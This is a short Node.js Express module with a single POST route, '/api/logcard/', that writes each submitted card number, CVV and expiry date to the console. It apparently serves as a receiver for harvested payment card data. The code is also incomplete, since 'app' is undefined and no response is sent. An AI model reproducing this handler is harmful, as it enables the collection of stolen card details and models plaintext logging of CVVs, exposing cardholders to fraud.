module.exports = () => {
    app.post("/api/logcard/", (req, res) => {
        let data = req["body"]

        console.log(data["number"] + " : " + data["cvv"] + " : " + data["date"])

    })
}